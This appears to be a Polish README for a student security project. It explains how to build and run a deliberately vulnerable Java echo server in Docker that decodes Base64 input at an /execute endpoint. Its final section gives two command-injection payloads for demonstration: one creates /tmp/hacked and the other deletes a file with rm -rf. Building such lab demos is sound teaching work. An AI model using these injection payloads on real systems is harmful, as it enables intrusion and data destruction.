# TBO_Projekt

## Budowa

`mvn clean package`

`sudo docker build -t demo-app .`

`sudo docker run -d --network=host demo-app`

## Działanie

Serwer echo nasłuchuje nadchodzących wiadomości zakodowanych w Base64:

`curl -X POST "http://localhost:8081/execute" --data-binary "$(echo -n 'Hello' | base64)"`

## Sprawdzenie kontenera

Uzyskanie ID kontenera:

`sudo docker ps`

Odczyt logów:

`sudo docker logs <ID_kontenera>`

Otwarcie terminalu kontenera:

`sudo docker exec -it <ID_kontenera> bash`

## Eksploitacja/ładunki

Przykłady do demonstracji:

`curl -X POST "http://localhost:8081/execute" --data-binary "$(echo -n 'Hello=\0 && touch /tmp/hacked' | base64)"`

`curl -X POST "http://localhost:8081/execute" --data-binary "$(echo -n 'Hello=\0 && rm -rf /tmp/important_file' | base64)"`
